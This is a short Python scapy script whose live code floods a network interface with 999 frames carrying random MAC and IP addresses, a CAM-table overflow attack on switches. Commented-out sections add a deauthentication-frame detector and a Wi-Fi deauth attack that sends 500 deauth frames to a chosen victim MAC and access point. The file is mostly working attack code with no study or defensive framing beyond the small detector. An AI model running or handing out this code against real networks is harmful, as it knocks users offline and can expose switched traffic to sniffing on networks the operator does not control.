from scapy.all import *
from scapy.layers.dot11 import Dot11
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether


def generate_packets():
    packet_list = []
    for i in range(1, 1000):
        packet = Ether(src=RandMAC(), dst=RandMAC()) / IP(src=RandIP(), dst=RandIP())
        packet_list.append(packet)
    return packet_list


def cam_overflow(packet_list):
   sendp(packet_list, iface='wlan')


if __name__ == '__main__':
   packet_list = generate_packets()
   cam_overflow(packet_list)

# ------------------------------------------------------------------- #
# i = 1
#
#
# def deauth_frame(pkt):
#     if pkt.haslayer(Dot11):
#         if (pkt.type == 0) & (pkt.subtype == 12):
#             global i
#             print("Deauth frame detected: ", i)
#             i = i + 1
#     sniff(iface="mon0", prn=deauth_frame)

# ------------------------------------------------------------------- #
# import sys
#
# from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
#
# BSSID = input("Enter MAC address of the Access Point:- ")
# vctm_mac = input("Enter MAC address of the Victim:- ")
#
# frame = RadioTap() / Dot11(addr1=vctm_mac, addr2=BSSID, addr3=BSSID) / Dot11Deauth()
#
# sendp(frame, iface="mon0", count=500, inter=.1)
